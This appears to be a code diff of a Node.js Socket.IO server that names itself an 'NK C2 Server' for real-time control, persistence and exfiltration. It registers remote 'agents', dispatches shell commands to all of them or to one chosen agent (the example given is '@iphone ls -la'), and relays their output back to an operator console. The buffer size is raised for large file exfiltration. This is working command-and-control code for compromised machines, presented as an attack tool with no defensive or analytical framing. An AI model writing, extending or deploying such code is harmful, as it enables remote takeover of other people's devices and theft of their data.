@@ -1,59 +1,59 @@
-
-// --- NK C2 SERVER (REAL TIME + PERSISTENT + EXFIL) ---
-// UPDATED: 2025-12-04T12:27:54.080Z
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const path = require('path');
 const cors = require('cors');
 
 const app = express();
 const server = http.createServer(app);
-// Increase buffer size for large file downloads (Exfiltration)
-const io = new Server(server, { 
-    cors: { origin: "*" },
-    maxHttpBufferSize: 1e8 // 100 MB Limit
-});
+const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });
 
 app.use(cors());
-app.use(express.static(path.join(__dirname, 'public')));
 
 let agents = new Map();
 
 io.on('connection', (socket) => {
-    console.log('[SOCK] New Connection: ' + socket.id);
-
     // 1. Identificação
     socket.on('identify', ({ type, id }) => {
         if (type === 'agent') {
-            agents.set(socket.id, id);
-            console.log(`[AGENT] Online: ${id}`);
-            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${id} (Secure Link)`);
+            agents.set(id, socket.id);
+            console.log(`[AGENT] ${id} Connected`);
+            io.emit('log', `[SYSTEM] NEW AGENT: ${id}`);
         } else {
-            console.log('[CONSOLE] Admin UI Connected');
+            console.log('[UI] Console Connected');
         }
     });
 
     // 2. Comandos (UI -> Agent)
     socket.on('cmd', (data) => {
-        console.log(`[CMD] Dispatching: ${data.cmd}`);
-        io.emit('exec', data); // Broadcast to all agents
+        // Suporte a alvo especifico: "@iphone ls -la"
+        const cmd = data.cmd;
+        if (cmd.startsWith('@')) {
+            const parts = cmd.split(' ');
+            const targetId = parts[0].substring(1);
+            const actualCmd = parts.slice(1).join(' ');
+            const targetSocket = agents.get(targetId);
+            
+            if (targetSocket) {
+                io.to(targetSocket).emit('exec', { cmd: actualCmd });
+                io.emit('log', `[CMD] Sent to ${targetId}: ${actualCmd}`);
+            } else {
+                io.emit('log', `[ERR] Target ${targetId} not found.`);
+            }
+        } else {
+            // Broadcast para todos (padrão Swarm)
+            io.emit('exec', data);
+        }
     });
 
-    // 3. Logs em Tempo Real (Agent -> UI)
+    // 3. Logs (Agent -> UI)
     socket.on('stream_log', (data) => {
-        // data = { output: "line of text", from: "agent_id" }
-        io.emit('log', data.output);
+        io.emit('log', `[${data.from}] ${data.output}`);
     });
 
     socket.on('disconnect', () => {
-        if (agents.has(socket.id)) {
-            const id = agents.get(socket.id);
-            io.emit('log', `[SYSTEM] AGENT LOST: ${id}`);
-            agents.delete(socket.id);
-        }
+        // Cleanup agent list logic here if needed
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`NK C2 Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`NK C2 v5.0 running on port ${PORT}`));
